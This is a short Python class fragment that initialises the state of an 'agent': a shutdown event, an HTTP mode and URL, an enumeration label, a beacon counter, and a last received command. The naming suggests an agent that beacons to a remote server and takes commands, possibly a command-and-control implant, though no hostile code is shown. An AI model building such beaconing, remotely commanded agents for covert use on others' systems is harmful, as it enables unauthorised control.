class AgentContext:
    def __init__(self):
        self.shutdown_event  = threading.Event()
        self.http_mode       = False
        self.http_url        = ""
        self.enumeration_label: Optional[str] = None
        self.beacon_count    = 0
        self.last_z_value    = 0
        self.last_z_command  = "CONTINUE"


